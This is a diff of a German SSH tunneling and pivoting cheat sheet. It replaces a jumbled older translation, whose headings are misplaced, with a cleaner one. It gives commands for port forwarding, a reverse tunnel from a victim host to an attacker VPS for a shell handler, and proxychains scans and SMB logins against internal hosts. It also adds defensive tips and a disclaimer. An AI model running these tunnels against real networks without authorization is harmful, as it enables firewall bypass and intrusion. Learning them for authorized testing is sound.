@@ -1,12 +1,16 @@
-# 🚇 SSH-Tunneling – vollständiger Spickzettel
-
 <!-- language-home-navigation -->
 [🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)
+
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🚇 SSH-Tunneling und Proxychains – Vollständiger Cheatsheet
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
   ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
   ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
@@ -16,136 +20,125 @@
   ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
        Pivoting, Port Forwarding (-L, -R, -D) & Proxychains Integration
 ```
-
 <p align="center">
-  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="SSH Tunneling">
+  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="SSH-Tunneling">
   <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunnels-green?style=for-the-badge" alt="Pivoting">
   <img src="https://img.shields.io/badge/Integration-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
   <img src="https://img.shields.io/badge/Protocol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
 </p>
 
 <p align="center">
-  <b>🚇 Comprehensive reference for Local (-L), Remote/Reverse (-R), and Dynamic SOCKS (-D) SSH tunnels with Proxychains-ng integration</b>
+  <b>🚇 Umfassende Referenz für lokale (-L), Remote/Reverse (-R) und dynamische SOCKS (-D) SSH-Tunnel mit Proxychains-ng-Integration</b>
 </p>
 
 ---
 
 ## 📋 Inhaltsverzeichnis
 
-- [Einführung](#-overview--tunneling-architectures)
-- [Local Port Forwarding (`-L`)](#-local-port-forwarding--l)
-  - [Grundsyntax](#syntax--mechanics)
-  - [Forwarding an Internal Web Interface](#forwarding-an-internal-web-interface)
-  - [Forwarding Remote Database Ports](#forwarding-remote-database-ports)
-- [Remote / Reverse Port Forwarding (`-R`)](#-remote--reverse-port-forwarding--r)
-  - [Grundsyntax](#syntax--mechanics-1)
-  - [Exposing Local Reverse Shell Handler](#exposing-local-reverse-shell-handler)
-  - [Relaying Inbound Traffic from DMZ](#relaying-inbound-traffic-from-dmz)
-- [Dynamic SOCKS Forwarding (`-D`)](#-dynamic-socks-forwarding--d)
-  - [Installation](#syntax--socks5-setup)
-- [Proxychains-ng Configuration](#-proxychains-ng-configuration)
-  - [Configuring `/etc/proxychains4.conf`](#configuring-etcproxychains4conf)
-  - [Routing CLI Tools through Proxychains](#routing-cli-tools-through-proxychains)
-- [Multi-Hop Pivoting & Jump Hosts (`-J`)](#-multi-hop-pivoting--jump-hosts--j)
-- [Persistent Tunnels with Autossh](#-persistent-tunnels-with-autossh)
-- [Interactive SSH Escape Sequences (`~C`)](#-interactive-ssh-escape-sequences-c)
-- [Kurzreferenz](#-quick-reference-table)
-- [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
-- [Legal Disclaimer](#-legal-disclaimer)
+- [Übersicht & Tunnelarchitekturen](#-overview--tunneling-architectures)
+- [Lokale Portweiterleitung (`-L`)](#-local-port-forwarding--l)
+  - [Syntax & Mechanik](#syntax--mechanics)
+  - [Weiterleiten eines internen Webinterfaces](#forwarding-an-internal-web-interface)
+  - [Remote-Datenbank-Ports weiterleiten](#forwarding-remote-database-ports)
+- [Remote-/Reverse-Port-Weiterleitung (`-R`)](#-remote--reverse-port-forwarding--r)
+  - [Syntax & Mechanik](#syntax--mechanics-1)
+  - [Lokalen Reverse-Shell-Handler verfügbar machen](#exposed-local-reverse-shell-handler)
+  - [Eingehenden Datenverkehr von DMZ weiterleiten](#relaying-inbound-traffic-from-dmz)
+- [Dynamische SOCKS-Weiterleitung (`-D`)](#-dynamic-socks-forwarding--d)
+  - [Syntax & SOCKS5-Setup](#syntax--socks5-setup)
+- [Proxychains-ng-Konfiguration](#-proxychains-ng-configuration)
+  - [Konfigurieren von `/etc/proxychains4.conf`](#configuring-etcproxychains4conf)
+  - [CLI-Tools über Proxychains weiterleiten](#routing-cli-tools-through-proxychains)
+- [Multi-Hop-Pivoting & Jump-Hosts (`-J`)](#-multi-hop-pivoting--jump-hosts--j)
+- [Persistente Tunnel mit Autossh](#-persistent-tunnels-with-autossh)
+- [Interaktive SSH-Escape-Sequenzen (`~C`)](#-interactive-ssh-escape-sequences-c)
+- [Kurzreferenztabelle](#-quick-reference-table)
+- [Verteidigungsüberlegungen und OPSEC](#-defensive-considerations--opsec)
+- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)
 
 ---
 
-## 🎯 Einführung
+## 🎯 Übersicht und Tunnelarchitekturen
 
-SSH is not merely a remote terminal client; it is an encrypted, bidirectional byte stream transport layer that circumvents restrictive egress/ingress firewall policies:
+SSH ist nicht nur ein Remote-Terminal-Client; Es handelt sich um eine verschlüsselte, bidirektionale Bytestream-Transportschicht, die restriktive Egress-/Ingress-Firewall-Richtlinien umgeht:
 
-1. **Local Port Forwarding (`-L`):** Opens a listening port on the **attacker's local machine**; connections are tunneled through SSH and forwarded to a destination reachable from the remote SSH server.
-2. **Remote Port Forwarding (`-R`):** Opens a listening port on the **remote SSH server**; incoming connections are tunneled back to the attacker's local machine or internal target.
-3. **Dynamic Port Forwarding (`-D`):** Turns the SSH client into a local **SOCKS4/SOCKS5 proxy**, allowing tools (Nmap, Burp Suite, Ffuf, Metasploit) to route arbitrary TCP traffic across the remote network.
-
+1. **Lokale Portweiterleitung (`-L`):** Öffnet einen Überwachungsport auf dem **lokalen Rechner des Angreifers**; Verbindungen werden über SSH getunnelt und an ein Ziel weitergeleitet, das vom Remote-SSH-Server aus erreichbar ist.
+2. **Remote-Port-Weiterleitung (`-R`):** Öffnet einen Überwachungsport auf dem **Remote-SSH-Server**; Eingehende Verbindungen werden zurück zum lokalen Computer oder internen Ziel des Angreifers getunnelt.
+3. **Dynamische Portweiterleitung (`-D`):** Verwandelt den SSH-Client in einen lokalen **SOCKS4/SOCKS5-Proxy** und ermöglicht Tools (Nmap, Burp Suite, Ffuf, Metasploit), beliebigen TCP-Verkehr über das Remote-Netzwerk weiterzuleiten.
 ```
 Attacker [Kali]                  SSH Bastion / Pivot               Internal Target
  192.168.1.50   =========>       10.10.10.200 (Dual NIC)  ------>  172.16.0.15:80
    (Local)                       (SSH Server)                      (Isolated Host)
 ```
-
 ---
 
-## 🔌 Local Port Forwarding (`-L`)
+## 🔌 Lokale Portweiterleitung (`-L`)
 
-### Grundsyntax
+### Syntax und Mechanik
 ```
 ssh -L [bind_address:]<local_port>:<destination_host>:<destination_port> user@bastion
 ```
-
-### Forwarding an Internal Web Interface
-🔌 Local Port Forwarding (`-L`)
+### Weiterleitung eines internen Webinterfaces
+Greifen Sie über Pivot `10.10.10.200` auf ein Webadministrationspanel auf `172.16.0.15:80` zu:
 ```bash
 ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
 ```
-*Now browse to `http://127.0.0.1:8080` in your local browser.*
+*Navigieren Sie nun in Ihrem lokalen Browser zu `http://127.0.0.1:8080`.*
 
-### Forwarding Remote Database Ports
-Forwarding an Internal Web Interface
+### Weiterleitung von Remote-Datenbank-Ports
+Greifen Sie auf eine interne PostgreSQL-Datenbank zu, die nur an `127.0.0.1:5432` auf dem Remote-Server gebunden ist:
 ```bash
 ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
 ```
-
-🔓 Password Brute-Forcing (`wp-login.php` & XML-RPC)
-> Flags used:
-Forwarding Remote Database Ports
-Access an internal PostgreSQL database bound only to `127.0.0.1:5432` on the remote server:
+> [!NOTE]
+> Verwendete Flaggen:
+> - `-N`: Führen Sie keinen Remote-Shell-Befehl aus (nur Tunnel).
+> - `-f`: Im Hintergrund unmittelbar vor der Befehlsausführung ausführen.
 
 ---
 
-## 🔄 Remote / Reverse Port Forwarding (`-R`)
+## 🔄 Remote-/Reverse-Port-Weiterleitung (`-R`)
 
-### Grundsyntax
+### Syntax und Mechanik
 ```
 ssh -R [bind_address:]<remote_port>:<local_host>:<local_port> user@attacker_vps
 ```
-
-### Exposing Local Reverse Shell Handler
-🔄 Remote / Reverse Port Forwarding (`-R`)
+### Lokalen Reverse-Shell-Handler verfügbar machen
+Durchbrechen Sie ausgehende Firewalls von einem kompromittierten Zielcomputer hinter NAT aus, um Datenverkehr an Ihren externen Listener auf VPS zu senden:
 ```bash
 # Executed on victim / pivot machine
 ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
 ```
-
-### Relaying Inbound Traffic from DMZ
-Forward port 8080 on the remote pivot to local port 80:
+### Weiterleitung des eingehenden Datenverkehrs von der DMZ
+Leiten Sie Port 8080 auf dem Remote-Pivot an den lokalen Port 80 weiter:
 ```bash
 ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
 ```
-
 > [!IMPORTANT]
-> To bind remote ports to all interfaces (`0.0.0.0`), the SSH server's `/etc/ssh/sshd_config` must set:
-Relaying Inbound Traffic from DMZ
+> Um Remote-Ports an alle Schnittstellen (`0.0.0.0`) zu binden, muss der `/etc/ssh/sshd_config` des SSH-Servers Folgendes festlegen:
+> `GatewayPorts yes` oder `GatewayPorts clientspecified`.
 
 ---
 
-## 🌐 Dynamic SOCKS Forwarding (`-D`)
+## 🌐 Dynamische SOCKS-Weiterleitung (`-D`)
 
-### Installation
-Create a dynamic SOCKS5 proxy on local port `1080`:
+### Syntax und SOCKS5-Setup
+Erstellen Sie einen dynamischen SOCKS5-Proxy auf dem lokalen Port `1080`:
 ```bash
 ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
 ```
-
-🌐 Dynamic SOCKS Forwarding (`-D`)
+Stellen Sie sicher, dass der SOCKS-Proxy lauscht:
 ```bash
 ss -tlpn | grep 1080
 ```
-
 ---
 
-## ⚙️ Proxychains-ng Configuration
+## ⚙️ Proxychains-ng-Konfiguration
 
-Proxychains intercepts dynamic library network calls (`connect()`, `gethostbyname()`) via `LD_PRELOAD` to force standard CLI applications through SOCKS/HTTP proxies.
+Proxychains fängt dynamische Bibliotheksnetzwerkaufrufe (`connect()`, `gethostbyname()`) über `LD_PRELOAD` ab, um Standard-CLI-Anwendungen über SOCKS/HTTP-Proxys zu erzwingen.
 
-### Configuring `/etc/proxychains4.conf`
-Edit the configuration file to point to your SSH Dynamic SOCKS tunnel:
-
+### `/etc/proxychains4.conf` konfigurieren
+Bearbeiten Sie die Konfigurationsdatei so, dass sie auf Ihren SSH Dynamic SOCKS-Tunnel verweist:
 ```ini
 # Enable dynamic chain or strict chain
 strict_chain
@@ -157,8 +150,7 @@ proxy_dns
 # protocol  ip          port
 socks5      127.0.0.1   1080
 ```
-
-### Routing CLI Tools through Proxychains
+### CLI-Tools über Proxychains weiterleiten
 ```bash
 # Nmap TCP Connect Scan (Note: SYN scans do NOT work through SOCKS proxies)
 proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389
@@ -169,13 +161,11 @@ proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'
 # Web fuzzing internal server
 proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
 ```
-
 ---
 
-## 🔀 Multi-Hop Pivoting & Jump Hosts (`-J`)
+## 🔀 Multi-Hop-Pivoting- und Jump-Hosts (`-J`)
 
-When traversing multiple segmented firewall boundaries:
-
+Beim Durchqueren mehrerer segmentierter Firewall-Grenzen:
 ```bash
 # Jump through Bastion 1, then Bastion 2, to reach Target
 ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal
@@ -183,13 +173,11 @@ ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@interna
 # Dynamic SOCKS over double jump
 ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
 ```
-
 ---
 
-## 🔁 Persistent Tunnels with Autossh
+## 🔁 Persistente Tunnel mit Autossh
 
-When SSH tunnels drop due to network timeout or NAT drops, `autossh` automatically monitors and restarts the SSH connection:
-
+Wenn SSH-Tunnel aufgrund von Netzwerk-Timeout oder NAT-Ausfällen unterbrochen werden, überwacht `autossh` automatisch die SSH-Verbindung und startet sie neu:
 ```bash
 # Install autossh
 sudo apt install -y autossh
@@ -197,51 +185,49 @@ sudo apt install -y autossh
 # Establish background auto-reconnecting SOCKS tunnel
 autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
 ```
-
 ---
 
-## ⌨️ Interactive SSH Escape Sequences (`~C`)
+## ⌨️ Interaktive SSH-Escape-Sequenzen (`~C`)
 
-If you already have an interactive SSH session open and suddenly need to open a port forward without disconnecting:
+Wenn Sie bereits eine interaktive SSH-Sitzung geöffnet haben und plötzlich eine Portweiterleitung öffnen müssen, ohne die Verbindung zu trennen:
 
-1. Press `Enter`
-2. Type `~C` (Tilde followed by capital C)
-⌨️ Interactive SSH Escape Sequences (`~C`)
-4. Add your forwarding rules on the fly:
+1. Drücken Sie `Enter`
+2. Geben Sie `~C` ein (Tilde gefolgt von einem großen C)
+3. Die Eingabeaufforderung ändert sich zu `ssh> `
+4. Fügen Sie Ihre Weiterleitungsregeln im Handumdrehen hinzu:
    ```text
    ssh> -L 8080:192.168.10.50:80
    Forwarding port.
    ```
-   Or create dynamic SOCKS:
+Oder erstellen Sie dynamische SOCKS:
    ```text
    ssh> -D 1080
    ```
-
 ---
 
-## ⚡ Kurzreferenz
+## ⚡ Kurzreferenztabelle
 
-|Objective|Befehl|
+| Ziel | Befehl |
 |-----------|---------|
-|**Local Port Forward**|`ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot`|
-|**Remote Port Forward**|`ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps`|
-|**Dynamic SOCKS5 Proxy**|`ssh -N -D 127.0.0.1:1080 user@pivot`|
-|**Background Silent Tunnel**|`ssh -f -N -D 1080 user@pivot`|
-|**Jump Host Pivot**|`ssh -J user@hop1,user@hop2 target`|
-|**Run Tool via Proxychains**|`proxychains4 <TOOL> <ARGS>`|
-|**Persistent Auto-Reconnect**|`autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot`|
-|**On-the-fly Tunnel**|`Enter` then `~C` -> `ssh> -D 1080`|
+| **Lokale Portweiterleitung** | `ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot` |
+| **Remote-Port-Weiterleitung** | `ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps` |
+| **Dynamischer SOCKS5-Proxy**| `ssh -N -D 127.0.0.1:1080 user@pivot` |
+| **Stiller Tunnel im Hintergrund** | `ssh -f -N -D 1080 user@pivot` |
+| **Jump Host Pivot** | `ssh -J user@hop1,user@hop2 target` |
+| **Tool über Proxychains ausführen** | `proxychains4 <TOOL> <ARGS>` |
+| **Persistente automatische Neuverbindung** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
+| **On-the-Fly-Tunnel** | `Enter` dann `~C` -> `ssh> -D 1080` |
 
 ---
 
-## 🛡️ Defensive Considerations & OPSEC
+## 🛡️ Defensive Überlegungen und OPSEC
 
-1. **Disable Port Forwarding in SSHD:** Set `AllowTcpForwarding no` and `PermitTunnel no` in `/etc/ssh/sshd_config` on hardened production systems.
-2. **Network Flow Anomaly Detection:** Persistent long-running SSH sessions transferring substantial bi-directional byte streams often indicate interactive tunneling or data exfiltration.
+1. **Deaktivieren Sie die Portweiterleitung in SSHD:** Legen Sie `AllowTcpForwarding no` und `PermitTunnel no` in `/etc/ssh/sshd_config` auf gehärteten Produktionssystemen fest.
+2. **Erkennung von Netzwerkflussanomalien:** Dauerhafte SSH-Sitzungen mit langer Laufzeit, die umfangreiche bidirektionale Byteströme übertragen, deuten häufig auf interaktives Tunneln oder Datenexfiltration hin.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Rechtlicher Haftungsausschluss
 
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> SSH tunneling and network pivoting must only be performed on networks and systems where explicit written authorization has been obtained. Unauthorized bypassing of perimeter network firewalls is illegal.
+> [!ACHTUNG]
+> SSH-Tunneling und Netzwerk-Pivoting dürfen nur auf Netzwerken und Systemen durchgeführt werden, für die eine ausdrückliche schriftliche Genehmigung vorliegt. Das unbefugte Umgehen von Perimeternetzwerk-Firewalls ist illegal.
